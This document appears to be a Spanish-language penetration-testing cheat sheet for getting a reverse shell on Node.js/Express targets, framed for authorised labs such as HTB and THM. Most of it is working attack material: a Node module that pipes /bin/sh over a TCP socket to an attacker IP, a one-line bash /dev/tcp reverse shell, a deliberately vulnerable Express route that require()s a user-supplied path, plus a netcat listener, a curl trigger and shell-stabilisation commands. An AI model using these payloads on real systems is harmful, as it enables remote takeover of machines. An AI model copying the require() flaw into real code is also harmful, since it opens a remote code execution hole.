# Reverse shell con Node.js / Express

Payloads de reverse shell para objetivos Node.js/Express. Úsalo **solo en laboratorios propios o autorizados** (THM, HTB, Hack The Box, etc.).

## 1. Payload: módulo Node.js (reverse shell)

Reemplaza el típico módulo de prueba:

```js
const { execSync } = require('child_process');
module.exports = execSync('id').toString();
```

por este módulo, que abre un socket TCP hacia el atacante y conecta `stdin`/`stdout`/`stderr` de una shell:

```js
// shell.js
const net = require('net');
const { spawn } = require('child_process');

const HOST = '10.10.14.5'; // IP del atacante
const PORT = 4444;

const shell = spawn('/bin/sh', [], { stdio: ['pipe', 'pipe', 'pipe'] });
const client = new net.Socket();

client.connect(PORT, HOST, () => {
  client.write('[+] Reverse shell conectada\n');
  shell.stdout.pipe(client);
  shell.stderr.pipe(client);
  client.pipe(shell.stdin);
});

client.on('close', () => shell.kill());
client.on('error', () => {}); // silencioso

module.exports = 'ok';
```

### Variante corta (requiere `bash` y `/dev/tcp`)

```js
// shell.js
const { exec } = require('child_process');

exec(`bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'`);

module.exports = 'ok';
```

## 2. Aplicación Express vulnerable (objetivo de laboratorio)

Simula un app que carga módulos controlados por el usuario (`require()` con entrada del cliente):

```js
// server.js (objetivo)
const express = require('express');
const path = require('path');

const app = express();

app.get('/load', (req, res) => {
  const mod = req.query.module;
  try {
    const result = require(path.resolve(mod)); // <- vulnerable
    res.send(String(result));
  } catch (err) {
    res.status(500).send(err.message);
  }
});

app.listen(3000, () => console.log('App vulnerable en :3000'));
```

Instalación y arranque:

```bash
npm init -y && npm install express
node server.js
```

## 3. Escucha y ejecución

```bash
# 1) Atacante: listener
nc -lvnp 4444

# 2) Servir el payload (opcional, si se descarga desde el objetivo)
python3 -m http.server 8000

# 3) Disparar el payload desde el objetivo
curl 'http://OBJETIVO:3000/load?module=/tmp/shell.js'
```

## 4. Estabilizar la shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Notas

- El módulo usa `spawn` + `net.Socket`, así que no depende de `/dev/tcp` (más portable que la variante bash).
- Si el objetivo solo permite `execSync`, usa la variante corta con `bash -i`.
- Cambia `HOST`/`PORT` por la IP y el puerto de tu listener.
- Comandos relacionados: `Comando Rapido/Penelope — reverse shell.md`, `Comando Rapido/Shells y transferencia.md`.
